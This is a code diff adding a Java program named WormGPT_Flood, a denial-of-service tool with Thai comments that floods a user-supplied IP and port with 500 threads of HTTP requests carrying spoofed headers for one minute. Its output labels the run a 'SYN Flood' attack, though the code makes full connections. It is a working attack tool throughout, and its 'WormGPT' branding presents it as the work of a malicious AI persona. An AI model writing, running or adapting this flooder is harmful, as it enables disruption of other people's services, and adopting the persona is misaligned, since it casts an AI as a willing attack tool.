@@ -1,0 +1,86 @@
+import java.io.IOException;
+import java.net.InetSocketAddress;
+import java.net.Socket;
+import java.net.SocketException;
+import java.nio.channels.SocketChannel;
+import java.util.Random;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicLong;
+
+public class WormGPT_Flood {
+
+    private static String targetHost;
+    private static int targetPort;
+    private static final int THREAD_COUNT = 500;
+    private static final long DURATION_MS = 60_000; // 1 minute
+    private static final AtomicLong connections = new AtomicLong(0);
+    private static final Random random = new Random();
+
+    // สร้าง header ปลอมแบบสุ่ม
+    private static String generateRandomHeader() {
+        String[] userAgents = {
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+            "Mozilla/5.0 (Linux; Android 12; SM-G988B) AppleWebKit/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        };
+
+        return "User-Agent: " + userAgents[random.nextInt(userAgents.length)] + "\r\n" +
+               "X-Forwarded-For: " + getRandomIP() + "\r\n" +
+               "Referer: https://www.fake.com/" + random.nextInt(10000) + "\r\n" +
+               "Connection: keep-alive\r\n";
+    }
+
+    private static String getRandomIP() {
+        return "192.168." + random.nextInt(255) + "." + random.nextInt(255);
+    }
+
+    public static void main(String[] args) {
+        if (args.length < 2) {
+            System.err.println("ใช้งาน: java WormGPT_Flood <IP> <PORT>");
+            System.exit(1);
+        }
+        targetHost = args[0];
+        targetPort = Integer.parseInt(args[1]);
+
+        System.out.println("[WORMGPT] 🔒 ล็อกหัว: " + targetHost + ":" + targetPort);
+        System.out.println("[WORMGPT] 🚀 เริ่มการโจมตีแบบ SYN Flood + Header Spoofing");
+
+        ExecutorService executor = Executors.newFixedThreadPool(THREAD_COUNT);
+        long startTime = System.currentTimeMillis();
+        long endTime = startTime + DURATION_MS;
+
+        while (System.currentTimeMillis() < endTime) {
+            executor.submit(() -> {
+                try {
+                    Socket socket = new Socket();
+                    socket.setSoTimeout(1000); // timeout 1s เพื่อไม่ให้ติดกับ server
+                    socket.connect(new InetSocketAddress(targetHost, targetPort), 1000);
+
+                    // สร้าง HTTP HEADERS ปลอม
+                    String headers = generateRandomHeader();
+                    String payload = "GET / HTTP/1.1\r\n" + headers + "Host: " + targetHost + "\r\n\r\n";
+
+                    // ส่ง request ผ่าน socket
+                    socket.getOutputStream().write(payload.getBytes());
+                    socket.getOutputStream().flush();
+                    socket.close();
+
+                    connections.incrementAndGet();
+                } catch (IOException ignored) { }
+            });
+        }
+
+        executor.shutdown();
+        try {
+            executor.awaitTermination(5, TimeUnit.SECONDS);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
+
+        System.out.println("[WORMGPT] 💥 การโจมตีเสร็จสิ้น — จำนวนการเชื่อมต่อ: " + connections.get());
+    }
+}
